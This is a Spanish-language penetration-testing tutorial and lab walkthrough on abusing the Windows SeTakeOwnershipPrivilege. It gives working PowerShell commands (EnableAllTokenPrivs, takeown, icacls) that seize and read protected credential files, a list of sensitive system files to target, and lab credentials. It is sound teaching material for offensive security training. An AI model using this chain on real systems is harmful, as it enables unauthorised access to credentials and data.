
# SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) otorga a un usuario la capacidad de tomar posesión de cualquier "objeto protegible", es decir, objetos de Active Directory, archivos/carpetas NTFS, impresoras, claves de registro, servicios y procesos. Este privilegio asigna derechos [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) sobre un objeto, lo que significa que el usuario puede cambiar el propietario dentro del descriptor de seguridad del objeto. Los administradores tienen asignado este privilegio de forma predeterminada. Si bien es raro encontrar una cuenta de usuario estándar con este privilegio, podemos encontrarnos con una cuenta de servicio que, por ejemplo, tenga la tarea de ejecutar trabajos de respaldo e instantáneas VSS a las que se les asigne este privilegio.&#x20;

También se le pueden asignar algunos otros, como `SeBackupPrivilege`, `SeRestorePrivilege`, y `SeSecurityPrivilege` para controlar los privilegios de esta cuenta a un nivel más granular y no otorgarle a la cuenta derechos de administrador local completos. Estos privilegios por sí solos probablemente se podrían usar para escalar privilegios. Aún así, puede haber ocasiones en las que necesitemos tomar posesión de archivos específicos porque otros métodos están bloqueados o no funcionan como se espera. Abusar de este privilegio es un caso extremo. Aún así, vale la pena comprenderlo en profundidad, especialmente porque también podemos encontrarnos en un escenario en un entorno de Active Directory donde podemos asignar este derecho a un usuario específico que podemos controlar y aprovecharlo para leer un archivo confidencial en un recurso compartido de archivos.

![imagen](https://academy.hackthebox.com/storage/modules/67/change_owner.png)

La configuración se puede establecer en la Política de grupo en:

* `Computer Configuration`⇾ `Windows Settings`⇾ `Security Settings`⇾ `Local Policies`⇾`User Rights Assignment`

![imagen](https://academy.hackthebox.com/storage/modules/67/setakeowner2.png)

Con este privilegio, un usuario podría tomar posesión de cualquier archivo u objeto y realizar cambios que podrían implicar el acceso a datos confidenciales, `Remote Code Execution`( `RCE`)  o `Denial-of-Service`(DOS).

Supongamos que nos encontramos con un usuario con este privilegio o se lo asignamos mediante un ataque como el abuso de GPO mediante [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) . En ese caso, podríamos usar este privilegio para tomar el control de una carpeta compartida o archivos confidenciales como un documento que contenga contraseñas o una clave SSH.

***

## <mark style="color:purple;">Aprovechar el privilegio</mark>

### **Revisión de los privilegios de usuario actuales**

Repasemos los privilegios de nuestro usuario actual.

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### **Habilitar privilegio SeTakeOwnership**

Observe que en el resultado se observa que el privilegio no está habilitado. Podemos habilitarlo mediante este [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) que se detalla en [esta](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) publicación del blog, así como también [este](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) otro que se basa en el concepto inicial.

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### **Elección de un archivo de destino**

A continuación, elija un archivo de destino y confirme la propiedad actual. Para nuestros propósitos, apuntaremos a un archivo interesante que se encuentre en un recurso compartido de archivos. Es común encontrar recursos compartidos de archivos con directorios `Public` y `Private` con subdirectorios configurados por departamento. Dado el rol de un usuario en la empresa, a menudo puede acceder a archivos/directorios específicos. Incluso con una estructura como esta, un administrador de sistemas puede configurar incorrectamente los permisos en directorios y subdirectorios, lo que hace que los recursos compartidos de archivos sean una rica fuente de información para nosotros una vez que hayamos obtenido las credenciales de Active Directory (y, a veces, incluso sin necesidad de credenciales).&#x20;

Para nuestro escenario, supongamos que tenemos acceso al recurso compartido de archivos de la empresa de destino y podemos explorar libremente tanto los subdirectorios `Private` como `Public`. En su mayor parte, encontramos que los permisos están configurados de manera estricta y no hemos encontrado ninguna información interesante en la parte `Public` del recurso compartido de archivos. Al explorar la parte `Private`, descubrimos que todos los usuarios del dominio pueden enumerar el contenido de ciertos subdirectorios, pero reciben un mensaje `Access denied` cuando intentan leer el contenido de la mayoría de los archivos. Encontramos un archivo nombrado `cred.txt` en el subdirectorio `IT` de la carpeta `Private` del recurso compartido durante nuestra enumeración.

Dado que nuestra cuenta de usuario tiene `SeTakeOwnershipPrivilege`(que puede que ya haya sido otorgada), o explotamos alguna otra configuración incorrecta como un Objeto de Política de Grupo (GPO) demasiado permisivo para otorgarle a nuestra cuenta de usuario ese privilegio), podemos aprovecharlo para leer cualquier archivo que elijamos.

{% hint style="warning" %}
**Nota**: tenga mucho cuidado al realizar una acción potencialmente destructiva, como cambiar la propiedad de un archivo, ya que podría provocar que una aplicación deje de funcionar o interrumpir el funcionamiento de los usuarios del objeto de destino. Cambiar la propiedad de un archivo importante, como un archivo `web.config` activo, no es algo que haríamos sin el consentimiento previo de nuestro cliente. Además, cambiar la propiedad de un archivo enterrado en varios subdirectorios (mientras se cambia el permiso de cada subdirectorio al mismo tiempo) puede ser difícil de revertir y debe evitarse.
{% endhint %}

Revisemos nuestro archivo de destino para recopilar un poco más de información sobre él.

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

### **Comprobar la propiedad de los archivos**

Podemos ver que no se muestra el propietario, lo que significa que probablemente no tengamos suficientes permisos sobre el objeto para ver esos detalles. Podemos retroceder un poco y verificar quién es el propietario del directorio de TI.

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

Podemos ver que el recurso compartido de TI parece ser propiedad de una cuenta de servicio `sccm_svc` y contiene un archivo `cred.txt` con algunos datos en su interior.

### **Tomando posesión del archivo**

Ahora podemos usar el binario [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) de Windows para cambiar la propiedad del archivo.

```powershell
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### **Confirmar cambio de titularidad**

Podemos confirmar la propiedad utilizando el mismo comando que antes. Ahora vemos que nuestra cuenta de usuario es la propietaria del archivo.

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### **Modificación de la ACL del archivo**

Es posible que aún no podamos leer el archivo y necesitemos modificar la ACL del archivo `icacls` para poder leerlo.

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Otorguemos a nuestro usuario privilegios completos sobre el archivo de destino.

```powershell
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### **Leyendo el archivo**

Si todo salió según lo planeado, ahora podemos leer el archivo de destino desde la línea de comandos, abrirlo si tenemos acceso RDP o copiarlo a nuestro sistema de ataque para un procesamiento adicional (como crackear la contraseña de una base de datos KeePass).

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

Después de realizar estos cambios, nos gustaría hacer todo lo posible para revertir los permisos o la propiedad de los archivos. Si por alguna razón no podemos hacerlo, debemos avisar a nuestro cliente y documentar cuidadosamente las modificaciones en un apéndice de nuestro informe. Nuevamente, aprovechar este permiso puede considerarse una acción destructiva y debe hacerse con mucho cuidado. Algunos clientes pueden preferir que documentemos la capacidad de realizar la acción como evidencia de una configuración incorrecta, pero no que aprovechemos por completo la falla debido al impacto potencial.

***

## <mark style="color:purple;">¿Cuándo usarlo?</mark>

**Archivos de interés**

Algunos archivos locales de interés pueden incluir:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

También podemos encontrarnos con archivos `.kdbx` de base de datos de KeePass, cuadernos de OneNote, archivos como `passwords.*`, `pass.*`, `creds.*`, scripts, otros archivos de configuración, archivos de disco duro virtual y más, de los cuales podemos extraer información confidencial para elevar nuestros privilegios y ampliar nuestro acceso.

***

## <mark style="color:purple;">Caso práctico</mark>

```bash
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y la contraseña "HTB_@cademy_stdnt!"
```

> Aproveche los derechos `SeTakeOwnershipPrivilege` sobre el archivo ubicado en "`C:\TakeOwn\flag.txt`" y envíe el contenido.

#### Comprobar privilegios del usuario

Abrimos un Powershell de administrador y vemos el privilegio `SeTakeOwnershipPrivilege` pero no está habilitado.

```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

#### Habilitar privilegio

En el directorio C://Tool tenemos todos los binarios disponibles, incluidos los que usaremos: `Enable-Privilege.ps1` y `EnableAllTokenPrivs.ps1`

```powershell
PS C:\Tools> ls

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2021   1:37 PM                AccessChk
d-----        3/31/2021   3:05 PM                Mimikatz
d-----        4/16/2021   1:39 PM                PipeList
d-----        3/31/2021   3:27 PM                Procdump
d-----        5/12/2021  11:08 AM                RoguePotato
d-----        3/31/2021   3:11 PM                winPEAS
-a----        3/25/2021   2:57 PM         759176 accesschk64.exe
-a----        4/19/2021   1:57 PM           4554 Enable-Privilege.ps1
-a----        4/19/2021   2:00 PM           3449 EnableAllTokenPrivs.ps1
```

```powershell
PS C:\Tools> Import-Module .\Enable-Privilege.ps1
PS C:\Tools> .\EnableAllTokenPrivs.ps1
PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Vemos que ya tenemos el privilegio `SeTakeOwnershipPrivilege` habilitado.

#### Archivo flag.txt

Revisemos el archivo de flag.txt para recopilar un poco más de información sobre él. Ya sabemos que está en la ruta `C:\TakeOwn\flag.txt`

```powershell
PS C:\Tools> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive
```

Vemos que no tiene ningún owner asociado o no es visible

#### Takeown de flag.txt

Con takeown cambiamos el propietario del archivo al usuario actual.

```powershell
PSPS C:\Tools> takeown /f C:\TakeOwn\flag.txt

SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
```

```powershell
PS C:\Tools> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Express
ion={ (Get-Acl $_.FullName).Owner }}

FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive WINLPE-SRV01\htb-student
```

#### Lectura del archivo

Aún seguimos sin tener permisos para leer el archivo:

```powershell
PS C:\Tools> cat 'C:\TakeOwn\flag.txt'
cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat 'C:\TakeOwn\flag.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessExceptio
   n
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

#### Tomar control total del archivo

Vamos a usar icacls para otorgar permisos de lectura y escritura al usuario `htb-student`.

```powershell
PS C:\Tools> icacls C:\TakeOwn\flag.txt /grant htb-student:
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files


PS C:\Tools> cat 'C:\TakeOwn\flag.txt'
1m_th3_f1l3_*************
```

Finalmente obtenemos la flag!
